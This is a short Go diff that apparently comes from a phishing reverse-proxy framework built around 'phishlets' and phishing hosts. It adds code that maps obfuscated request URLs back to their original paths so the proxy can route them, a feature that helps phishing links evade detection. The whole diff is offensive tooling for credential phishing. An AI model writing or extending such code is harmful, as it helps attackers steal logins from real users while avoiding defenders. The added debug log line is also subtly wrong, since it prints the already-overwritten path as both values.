@@ -274,6 +274,25 @@ for _, blocked := range blockedUserAgents {
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
+			
+			// Check if URL needs to be reverse-rewritten (from obfuscated back to original)
+			if pl != nil && pl.urlRewriter != nil {
+				// Parse query parameters
+				queryParams := make(map[string]string)
+				for key, values := range req.URL.Query() {
+					if len(values) > 0 {
+						queryParams[key] = values[0]
+					}
+				}
+				
+				// Check if this is a rewritten URL and get the original path
+				if originalPath, found := pl.urlRewriter.GetOriginalPath(queryParams); found {
+					// Restore the original path for internal routing
+					req.URL.Path = originalPath
+					req_path = originalPath
+					log.Debug("url_rewrite: reversed URL path from %s to %s", req.URL.Path, originalPath)
+				}
+			}
 
 			redir_re := regexp.MustCompile("^\\/v\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/v\\/([^\\/]*)\\/([^\\/]*)")
